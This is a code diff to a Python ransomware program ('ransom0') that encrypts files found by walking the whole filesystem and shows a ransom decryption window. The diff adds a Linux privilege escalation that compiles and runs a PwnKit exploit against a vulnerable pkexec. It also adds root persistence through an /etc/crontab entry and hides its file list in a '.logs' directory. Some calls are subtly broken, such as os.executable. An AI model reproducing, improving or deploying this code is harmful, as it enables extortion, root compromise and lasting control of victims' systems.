@@ -13,12 +13,42 @@ import tkinter as tk
 from tkinter import *
 from random import randint
 
-
+logs_path = '.logs/path.txt'
 digits = randint(1111,9999) 
 key = Fernet.generate_key()
 
 url = '' # PUT THE URL YOU GOT FROM NGROK HERE
 
+def escalade_linux():
+    if os.getuid() == 0:
+        return
+    else:
+        if subprocess.getstatusoutput('gcc')[0] == 127 :
+            try: # vulnerable to pwnkit
+                if subprocess.getstatusoutput('pkexec')[0] == 127 \
+                and float(subprocess.getstatusoutput('pkexec --version')[1].split(sep=' ')[2]) < 0.101 \
+                and 's' in subprocess.getstatusoutput('ls -al $(which pkexec)')[1].split(sep='-')[1] :
+
+                    if subprocess.getstatusoutput('$(which gcc) -shared lin_exploit/PwnKit.c -o PwnKit -Wl,-e,entry -fPIC')[0] == 0:
+                        subprocess.getstatusoutput('chmod +x lin_exploit/PwnKit')
+                        subprocess.getstatusoutput(f'./lin_exploit/Pwnkit  {os.executable} {sys.argv[0]}')
+                        exit()
+
+
+            except:
+                pass
+
+
+def display_startup():
+    if os.getuid() == 0:
+        file = open('/etc/crontab','w') # add file in to crontab
+        i = f"* * * * * root {sys.executable} {os.getcwd()+'/'+sys.argv[0]} \n"
+        if i in open('/etc/crontab','r').read():
+            return 
+        file.write(i)
+        file.close()
+        return
+    return False
 
 
 class ransom0:
@@ -70,8 +100,9 @@ class ransom0:
     def clear(self): 
         subprocess.call('cls' if os.name == 'nt' else 'clear', shell=False)
         os.system('cls' if os.name == 'nt' else 'clear')
+
     def FindFiles(self):
-        f = open("logs/path.txt", "w")
+        f = open(logs_path, "w")
         cnt = 0
         for root, dirs, files in os.walk("/"):
             #for root, dirs, files in os.walk("YOUR/TESTING/DIRECTORY"):
@@ -111,11 +142,13 @@ ransom0 = ransom0()
 
 
 def StartRansom():
-
-
     try:
         ransom0.FindFiles()
-        filepath = 'logs/path.txt'
+        if sys.platform == 'linux' and os.getuid() != 0:
+            display_startup()
+            escalade_linux()
+
+        filepath = logs_path
         with open(filepath) as fp:
             line = fp.readline()
             while line:
@@ -187,7 +220,7 @@ def DECRYPT_FILE():
     label1.config(font=('helvetica', int(height/50)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
-    entry1 = tk.Entry (root) 
+    entry1 = tk.Entry(root) 
     canvas1.create_window(int(width/2), int(height/20)*12, window=entry1)
 
 
@@ -203,7 +236,7 @@ def DECRYPT_FILE():
                 file.write(decrypted_data)
 
 
-        with open('logs/path.txt') as fp:
+        with open(logs_path) as fp:
             line = fp.readline()
             while line:
                 filename = line.strip()
@@ -232,11 +265,12 @@ def DECRYPT_FILE():
 
 
 
-
-
 if __name__ == '__main__':
     # Generate digits ID or read generated value from digits.txt
     if path.exists("logs") is True:
+        i = f"{os.executable}/{sys.argv[0]}"
+        if (subprocess.getstatusoutput(f"ps -aux |grep {i}")[1].count(sys.argv[0]) or subprocess.getstatusoutput(f"ps -aux |grep 'python3 {sys.argv[0]}'")[1].count(sys.argv[0])) > 3 :
+            exit()
         f = open("logs/digits.txt", "r")
         digits = f.read()
         f.close()
